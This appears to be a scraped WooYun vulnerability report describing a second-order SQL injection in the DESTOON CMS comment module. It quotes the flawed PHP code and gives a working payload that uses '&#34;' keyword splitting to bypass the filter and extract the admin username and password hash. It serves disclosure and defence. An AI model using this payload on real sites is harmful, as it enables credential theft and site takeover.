{"id": 66411, "wybug_id": "wooyun-2015-0129090", "wybug_title": "DESTOON sql注入漏洞", "wybug_corp": "DESTOON", "wybug_author": "Noxxx", "wybug_date": "2015-07-27 12:00", "wybug_open_date": "2015-10-25 12:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向公众公开  简要描述： DESTOON sql注入漏洞 详细说明：  一枚二次注入,因为使用了dhtmlspecialchars导致防注入失效。可以任意数据。先来看留言模块：\\module\\extend\\comment.inc.php\n$item = $db->get_one(\"SELECT title,linkurl,username,status FROM \".get_table($mid).\" WHERE itemid=$itemid\"); //从数据库中取出对于模块的发布数据\t$item or exit;\t$item['status'] > 2 or exit;\t$linkurl = $MODULE[$mid]['linkurl'].$item['linkurl'];$template = $message = $forward = '';$username = $item['username'];$title = $item['title']; //看这里 我们这个标题是可以控制的 而且没有转义。 再看看下面 $title有没有被带入数据库中。$could_del = false;\n在这个文件的130行有这样一句\n$db->query(\"INSERT INTO {$DT_PRE}comment (item_mid,item_id,item_title,item_username,content,quotation,qid,addtime,username,hidden,star,ip,status) VALUES ('$mid','$itemid','$title','$username','$content','$quotation','$qid','$DT_TIME','$_username','$hidden','$star','$DT_IP','$status')\"); 看见没有 $title被带入数据库中。但是有一点.item_username 接着title的后面，这个用户名基本不可控制，但是如果他item_username 为空的话那就可以了，这个发布的东西是允许游客发送的 所以在游客状态下 item_username 就为空，后面的$content我们又刚好可以控制。所以导致了注入的发生。\n接下来就是要绕过防注入了..看这个文件的第95行导致防注入函数失效。$content = dhtmlspecialchars(trim($content));\nfunction dhtmlspecialchars($string) {\tif(is_array($string)) {\t\treturn array_map('dhtmlspecialchars', $string);\t} else {\t\tif(defined('DT_ADMIN')) {\t\t\treturn str_replace(array('&amp;'), array('&'), htmlspecialchars($string, ENT_QUOTES));\t\t} else {\t\t\treturn str_replace(array('&amp;', '&quot;', '&#34;', '\"'), array('&', '', '', ''), htmlspecialchars($string, ENT_QUOTES));\t\t}\t}}\n看见没有 &quot; &#34; \"  分别把这三个替换成空了的.那我们直接提交 这个 SEL&#34;ECT 即可无限制注射。首先得发布一个东西,名字写的正常一点就可以通过了。   漏洞证明：  发布一个东西,注意了 信息标题最后一个必须为 反斜杠才行。不能在登录状态发东西，必须为游客状态urlhttp://127.0.0.1:8081/php/destoon/member/my.php?mid=5\n\n通过之后 我们直接留言 exp:\n,1,1,(SEL&#34;ECT conc&#34;at(username,0&#34;x7c,password) FR&#34;OM destoon_member WH&#34;ERE admin=1 LIMIT 1),1,1,1,1,1,1,3)#\n\n\n\n\n   修复方案：  对数据进行处理,并且修改一下htmlspecialchars函数   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-27 12:09 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-27 12:02 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:778 漏洞数:98        )\t\t \n  厉害 ！！！    \n     2015-07-27 12:07 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  必须看看！    \n     2015-07-27 13:24 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  给师傅跪了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}